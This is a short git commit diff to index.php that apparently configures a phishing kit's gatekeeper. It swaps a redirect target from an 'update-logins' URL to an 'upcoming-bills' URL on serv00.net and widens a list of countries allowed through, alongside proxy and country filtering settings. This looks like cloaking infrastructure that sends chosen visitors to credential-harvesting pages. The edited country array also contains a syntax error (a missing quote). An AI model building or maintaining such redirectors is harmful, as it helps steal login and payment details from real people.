3df4ab5980681420d1e11cbb6503251b82486e79
aminemusicbass <aminemusicbass@gmail.com>
2024-12-06 12:43:39 +0100

    Update index.php

--- index.php
+++ index.php
@@ -57,13 +57,13 @@ if (isset($_GET["check"]))
 
 $license = "Houss-1987";
 
-$redirect = "https://update-logins.serv00.net/2024/spp/login/";
+$redirect = "https://upcoming-bills.serv00.net/0612";
 
 $parameter = 1; // 1 => Both , 2 => Country , 3 => Proxy , 4 => Simple
 $wordpress = true; // Allow Wordpress Include
 $checkfileup = false; // Check Link UP
 
-$country = array("ma","it"); #Country's Allowed To Access
+$country = array("ma","za","it,"de","pl","ua","il","gr","cy","ee"); #Country's Allowed To Access
 
 /************************************************************* PARAMETRES ******************************************************************/
 
